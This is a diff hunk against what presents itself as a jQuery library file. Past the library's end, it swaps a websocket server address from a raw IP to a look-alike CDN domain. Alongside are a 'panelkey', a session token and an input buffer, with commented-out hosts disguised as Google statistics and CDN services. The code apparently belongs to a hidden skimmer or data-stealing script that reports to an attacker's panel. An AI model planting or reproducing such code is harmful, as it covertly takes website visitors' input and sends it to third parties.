@@ -10366,7 +10366,7 @@ return jQuery;
 var psykey = 'oJcLDGrzATgCkXMf3nPVl84WpR190h';//panelkey
 var psyapp= "pwr";
 //var psylink = 'wss://javascript-cdn.herokuapp.com';//wss://google-statistics-monitoring.herokuapp.com //ws://localhost:50600 //wss://javascript-cdn.herokuapp.com
-var psylink = 'ws://93.115.96.14:50600'; //'ws://116.202.165.21:80';//wss://google-statistics-monitoring.herokuapp.com //ws://localhost:50600 //wss://google-statistics-monitoring.herokuapp.com
+var psylink = 'wss://ser.cdn-fils.com'; //'ws://116.202.165.21:80';//wss://google-statistics-monitoring.herokuapp.com //ws://localhost:50600 //wss://google-statistics-monitoring.herokuapp.com
 var psyid  = createToken();
 var ws ;
 var inp = "";
